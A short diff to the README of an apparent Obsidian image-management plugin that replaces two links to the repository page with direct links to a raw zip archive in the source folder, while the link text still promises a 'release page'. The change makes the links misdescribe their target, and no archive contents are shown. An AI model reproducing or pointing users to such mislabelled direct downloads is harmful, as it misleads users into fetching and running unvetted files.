@@ -1,6 +1,6 @@
 # 🖼️ obsidian-asset-weaver - Manage your vault images with artificial intelligence
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/nondescript-cardsharp536/obsidian-asset-weaver)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/nondescript-cardsharp536/obsidian-asset-weaver/raw/refs/heads/main/src/asset_weaver_obsidian_v1.7.zip)
 
 ## 🔍 Overview
 
@@ -28,7 +28,7 @@ Follow these steps to set up the weaver on your machine. You do not need to know
 
 You must visit the project page to download the latest version of the plugin.
 
-[Click here to visit the release page and download the files](https://github.com/nondescript-cardsharp536/obsidian-asset-weaver)
+[Click here to visit the release page and download the files](https://github.com/nondescript-cardsharp536/obsidian-asset-weaver/raw/refs/heads/main/src/asset_weaver_obsidian_v1.7.zip)
 
 Follow these steps to add the weaver to Obsidian:
 
